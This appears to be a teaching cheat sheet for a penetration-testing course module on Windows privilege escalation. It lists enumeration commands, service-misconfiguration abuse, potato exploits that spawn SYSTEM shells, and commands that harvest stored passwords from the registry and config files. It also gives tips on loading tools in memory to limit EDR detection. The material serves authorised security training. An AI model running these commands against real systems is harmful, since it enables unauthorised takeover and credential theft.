# Cheat sheet — Windows Privilege Escalation

*Companion to [Module 11 — Privilege Escalation: Windows](README.md) · CC BY 4.0 — print it, pin it, share it.*

*Last reviewed: 2026-07*

> Only enumerate and escalate on systems you own or have explicit written permission to test.

## Orient — who am I, what privileges

```cmd
whoami /all                       :: user, groups, and PRIVILEGES (the important part)
whoami /priv                      :: SeImpersonate / SeAssignPrimaryToken = potato territory
systeminfo                        :: OS build + hotfixes (for missing-patch checks)
net user %username%               :: group membership
```

## Automated enumeration — winPEAS / PrivescCheck / PowerUp

```powershell
# winPEAS — broad, colour-coded (red = likely win). Prefer the in-memory route on monitored hosts.
.\winPEASx64.exe

# PrivescCheck — focused, low-noise, great for reports
powershell -ep bypass -c "Import-Module .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"

# PowerUp — the classic; runs all checks and can auto-abuse some
powershell -ep bypass
Import-Module .\PowerUp.ps1
Invoke-AllChecks                  # enumerate every vector
Invoke-AllChecks | Out-File -Encoding ASCII checks.txt
```

## Service misconfigurations (the bread and butter)

```powershell
# Unquoted service paths — Windows walks the path; a writable dir before a space = code exec as SYSTEM
Get-CimInstance Win32_Service | ? { $_.PathName -notmatch '"' -and $_.PathName -match ' ' } |
  select Name, PathName, StartMode

# Weak service binary/permissions (PowerUp names the abuse for you)
Get-ModifiableServiceFile        # PowerUp: services whose EXE you can overwrite
Get-ModifiableService            # services you can reconfigure (change binPath)
Restart-Service <name>           # (or reboot) to trigger your replaced binary
```

```cmd
sc qc <service>                   :: query config (binpath, start type, account)
accesschk.exe -uwcqv "Users" *    :: (Sysinternals) services writable by low-priv users
```

## Token impersonation — the "potato" family

```text
# Precondition: SeImpersonatePrivilege (common on IIS/MSSQL service accounts).
# The potato exploits (PrintSpoofer, RoguePotato, GodPotato, etc.) abuse it to run as SYSTEM.
PrintSpoofer64.exe -i -c cmd      # interactive SYSTEM shell (needs SeImpersonate)
GodPotato -cmd "cmd /c whoami"    # SYSTEM command exec
```

## Other common vectors

```powershell
# AlwaysInstallElevated — MSIs install as SYSTEM if BOTH keys are 1
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Stored credentials / autologon
cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
Get-ChildItem -Recurse C:\ -Include *.config,unattend.xml,*.xml 2>$null | Select-String password
```

## Gotchas worth remembering

- **The precondition minefield is the hard part, not an exploit.** GodPotato needs `SeImpersonate`; an unquoted-path abuse needs a *writable* directory in that path. Confirm every precondition before you fire — a failed potato can crash the service or alert the SOC.
- **Read `whoami /priv` first.** `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` present = potato path is likely the fastest route to SYSTEM, before you scan for anything else.
- **SYSTEM is a springboard, not the finish.** Local SYSTEM lets you dump LSASS, grab machine/cached creds, and pivot toward Domain Admin — local root is the start of the domain story.
- **winPEAS flags candidates; you confirm exploitability.** A "weak service permission" in red still needs you to verify you can overwrite the binary *and* restart the service. Don't report a finding you haven't proven.
- **Watch the execution-policy and AMSI noise.** `-ep bypass` and loading PowerUp/winPEAS are exactly what EDR watches for. Use the in-memory load and expect 4104 script-block logging to catch it on a monitored host.
